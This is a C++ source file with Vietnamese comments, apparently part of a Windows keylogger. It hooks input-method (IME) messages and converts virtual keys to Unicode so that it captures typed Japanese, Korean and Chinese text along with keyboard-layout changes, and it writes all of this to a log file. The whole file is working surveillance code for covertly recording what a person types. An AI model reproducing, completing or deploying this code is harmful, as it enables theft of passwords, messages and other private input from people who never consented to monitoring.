#include "../multilanguage.h"
#include "../utils.h"
#include <imm.h>

#pragma comment(lib, "imm32.lib")

// Biến toàn cục để lưu trữ thông tin ngôn ngữ
LanguageInfo g_currentLanguage = { 0 };
HHOOK g_imeHook = NULL;

// Danh sách thông báo cần theo dõi cho IME
const UINT IME_MESSAGES[] = {
    WM_IME_STARTCOMPOSITION,
    WM_IME_ENDCOMPOSITION,
    WM_IME_COMPOSITION,
    WM_IME_NOTIFY,
    WM_IME_SETCONTEXT,
    WM_IME_CONTROL,
    WM_IME_COMPOSITIONFULL,
    WM_IME_SELECT,
    WM_IME_CHAR
};

LanguageInfo GetCurrentLanguageInfo() {
    LanguageInfo info = { 0 };

    // Lấy thread hiện tại
    DWORD threadId = GetCurrentThreadId();

    // Lấy layout bàn phím hiện tại
    info.keyboardLayout = GetKeyboardLayout(threadId);

    // Lấy ID ngôn ngữ
    info.languageId = LOWORD(info.keyboardLayout);

    // Kiểm tra IME có hoạt động không
    HWND hWnd = GetForegroundWindow();
    HIMC hImc = ImmGetContext(hWnd);

    if (hImc) {
        info.isImeActive = ImmGetOpenStatus(hImc);

        // Lấy chế độ chuyển đổi
        if (info.isImeActive) {
            ImmGetConversionStatus(hImc, &info.imeConvMode, NULL);
        }

        ImmReleaseContext(hWnd, hImc);
    }

    return info;
}

bool IsImeLanguage(HKL keyboardLayout) {
    LANGID langId = LOWORD(keyboardLayout);

    // Danh sách các ID ngôn ngữ IME phổ biến
    static const LANGID imeLanguages[] = {
        0x0411,  // Nhật Bản
        0x0412,  // Hàn Quốc
        0x0404,  // Trung Quốc (Đài Loan)
        0x0804,  // Trung Quốc (Giản thể)
        0x0C04,  // Trung Quốc (Hồng Kông)
        0x1004,  // Trung Quốc (Singapore)
        0x1404,  // Trung Quốc (Macao)
        0x0409   // Tiếng Anh (US) - Sẽ luôn trả về false
    };

    for (int i = 0; i < sizeof(imeLanguages) / sizeof(imeLanguages[0]) - 1; i++) {
        if (langId == imeLanguages[i]) {
            return true;
        }
    }

    return false;
}

std::wstring GetLanguageName(LANGID languageId) {
    WCHAR name[100] = { 0 };

    if (GetLocaleInfoW(languageId, LOCALE_SLANGUAGE, name, sizeof(name) / sizeof(WCHAR)) > 0) {
        return std::wstring(name);
    }

    // Fallback nếu không lấy được tên
    switch (languageId) {
    case 0x0411: return L"Japanese";
    case 0x0412: return L"Korean";
    case 0x0404: return L"Chinese (Traditional)";
    case 0x0804: return L"Chinese (Simplified)";
    case 0x0C04: return L"Chinese (Hong Kong)";
    case 0x1004: return L"Chinese (Singapore)";
    case 0x1404: return L"Chinese (Macao)";
    case 0x0409: return L"English (US)";
    default:     return L"Unknown";
    }
}

std::string Utf16ToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) {
        return "";
    }

    // Tính kích thước cần thiết
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);

    if (size <= 0) {
        return "";
    }

    // Chuyển đổi
    std::vector<char> buffer(size);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, buffer.data(), size, NULL, NULL);

    return std::string(buffer.data(), buffer.size() - 1); // Trừ null terminator
}

std::wstring Utf8ToUtf16(const std::string& str) {
    if (str.empty()) {
        return L"";
    }

    // Tính kích thước cần thiết
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);

    if (size <= 0) {
        return L"";
    }

    // Chuyển đổi
    std::vector<wchar_t> buffer(size);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer.data(), size);

    return std::wstring(buffer.data(), buffer.size() - 1); // Trừ null terminator
}

void WriteUnicode(const std::wstring& wstr) {
    if (!wstr.empty()) {
        // Chuyển về UTF-8 và ghi vào file
        std::string utf8Str = Utf16ToUtf8(wstr);
        Write(utf8Str);
    }
}

void UpdateImeStatus() {
    g_currentLanguage = GetCurrentLanguageInfo();

    // Ghi thông tin về ngôn ngữ khi thay đổi
    static HKL lastKeyboardLayout = 0;

    if (lastKeyboardLayout != g_currentLanguage.keyboardLayout) {
        std::wstring langName = GetLanguageName(g_currentLanguage.languageId);
        std::wstring logMsg = L"\n[LANGUAGE: " + langName + L"]\n";
        WriteUnicode(logMsg);

        lastKeyboardLayout = g_currentLanguage.keyboardLayout;
    }
}

std::wstring ExtractUnicodeCharFromKey(WPARAM virtualKey, BYTE keyState[256]) {
    wchar_t buffer[5] = { 0 };
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

    // Chuyển đổi mã phím thành ký tự Unicode
    int result = ToUnicodeEx(
        virtualKey,
        scanCode,
        keyState,
        buffer,
        sizeof(buffer) / sizeof(buffer[0]) - 1,
        0,
        g_currentLanguage.keyboardLayout
    );

    if (result > 0) {
        return std::wstring(buffer, result);
    }

    return L"";
}

LRESULT CALLBACK ImeHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    // Cập nhật thông tin IME
    UpdateImeStatus();

    CWPSTRUCT* cwp = (CWPSTRUCT*)lParam;

    // Xử lý các thông báo IME
    if (cwp) {
        for (int i = 0; i < sizeof(IME_MESSAGES) / sizeof(IME_MESSAGES[0]); i++) {
            if (cwp->message == IME_MESSAGES[i]) {
                // Lấy HIMC từ cửa sổ hiện tại
                HWND hWnd = cwp->hwnd;
                HIMC hImc = ImmGetContext(hWnd);

                if (hImc) {
                    switch (cwp->message) {
                    case WM_IME_STARTCOMPOSITION:
                        g_currentLanguage.isComposing = true;
                        g_currentLanguage.currentComposition.clear();
                        break;

                    case WM_IME_ENDCOMPOSITION:
                        g_currentLanguage.isComposing = false;
                        g_currentLanguage.currentComposition.clear();
                        break;

                    case WM_IME_COMPOSITION:
                        if (cwp->lParam & GCS_RESULTSTR) {
                            // Có kết quả chuỗi hoàn chỉnh
                            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);

                            if (bufLen > 0) {
                                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
                                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer.data(), bufLen);

                                // Ghi kết quả vào log
                                std::wstring resultStr(buffer.data());
                                WriteUnicode(resultStr);
                            }
                        }
                        else if (cwp->lParam & GCS_COMPSTR) {
                            // Chuỗi đang soạn thảo
                            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_COMPSTR, NULL, 0);

                            if (bufLen > 0) {
                                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
                                ImmGetCompositionStringW(hImc, GCS_COMPSTR, buffer.data(), bufLen);

                                g_currentLanguage.currentComposition = std::wstring(buffer.data());
                            }
                        }
                        break;

                    case WM_IME_CHAR:
                        // Ký tự IME
                    {
                        wchar_t wc = (wchar_t)cwp->wParam;
                        WriteUnicode(std::wstring(1, wc));
                    }
                    break;
                    }

                    ImmReleaseContext(hWnd, hImc);
                }

                break;
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}